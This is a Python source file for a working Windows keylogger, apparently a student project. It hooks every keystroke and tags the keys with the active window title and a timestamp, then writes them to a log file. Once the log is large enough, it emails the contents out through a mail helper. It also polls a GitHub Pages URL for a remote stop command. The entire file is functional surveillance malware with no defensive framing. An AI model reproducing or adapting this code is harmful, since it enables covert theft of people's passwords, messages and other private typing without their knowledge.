from pynput.keyboard import Key,Listener
import SendMail
import win32gui
import datetime
import requests
import threading
import sys
from bs4 import BeautifulSoup
import time
count = 0
keys = []
tempWindow=""
globalX=""
def on_press(key):
    global keys, count,tempWindow,globalX
    # Get the window name while typing :
    w = win32gui
    windowInfo=w.GetWindowText(w.GetForegroundWindow())

    if tempWindow != str(windowInfo):
        keys.append(" \n --New Windows-- \n ")
        e = datetime.datetime.now()
        info = 'At window: ' + str(windowInfo) + ' ' + str(e) + '- - -  \n'
        keys.append(info)

    keys.append(str(key))
    count += 1
    if(globalX=="CLOSE"):
        sys.exit(0)






    if count> 100:
        # every 10 keys will be added with name of the widow name date and time above them

        e = datetime.datetime.now()
        info=" \n At window: "+str(windowInfo)+ ' ' +str(e)+''
        keys.append(info)
        count = 0
        write_file(keys)
        keys.clear()

    tempWindow=windowInfo
def email(keys):
    keys=str(keys).replace("'","").replace("Key.space"," ").replace("Key.capslock","")\
       .replace("Key.backspace","").replace("Key.enter"," Enter \n").replace('\\n"',"\n").replace('\\n,',"\n").replace("\\","\ ")
    print(str(keys))
    """ message = ""
    for key in keys:
        k = key.replace("'","")
        if key == "Key.space":
            print("içeri girdi")
            k = " "
        if key == "Key.capslock":
            k = ""
        if key == "Key.backspace":
            k = ""
        if key == "Key.enter":
            k = " Enter \n"


        message += k"""
    #print(str(keys))
    SendMail.sendEmail(str(keys))

def on_release(key):
    global globalX
    if key == Key.esc:
        globalX="CLOSE"
        sys.exit(0)
        print("buraya girdi")
        return False
def write_file(keys):
    boolValue=False
    with open("log.txt","a") as f:
        for key in keys:
            try:
                f.write(key)
            except Exception as e:
                print(e)
        print(f.tell())
        if (int(f.tell()) > 15000):
            boolValue=True
            #email(keys)
           # print(keys)

        f.close()
    if boolValue:
      with open("log.txt", "r") as f:

                 email(f.readlines())


                 f.close()

      with open("log.txt", "w") as f:
          f.truncate(0)
          f.close()


def sorgula():
    global globalX
    while(True):

        url = "https://halil-ibrahim-gunbulak.github.io/AdvanceProgramming-WorkSpace/sorgu/index.html"
        soup = BeautifulSoup(requests.get(url).content, "html.parser")
        c = soup.find('div', attrs={"class": "text"})
        print(c)
        c = str(c).split(">")
        print(c[1][0:2])
        print(type(c))
        print(type(str(c[1][2])))
        print("içeri girdi")
        for i in range(120):
            time.sleep(1)
            if (globalX == "CLOSE"):
                sys.exit()


        print("süre bitti")
        globalX=str(c[1][0:2])



def startKeyLogger():
    with Listener(on_press = on_press, on_release = on_release) as listener:
         listener.join()


def main():
    global globalX
    t1 = threading.Thread(target=sorgula)
    t2 = threading.Thread(target=startKeyLogger)
    t1.start()
    t2.start()
    t1.join()
    t2.join()



main()


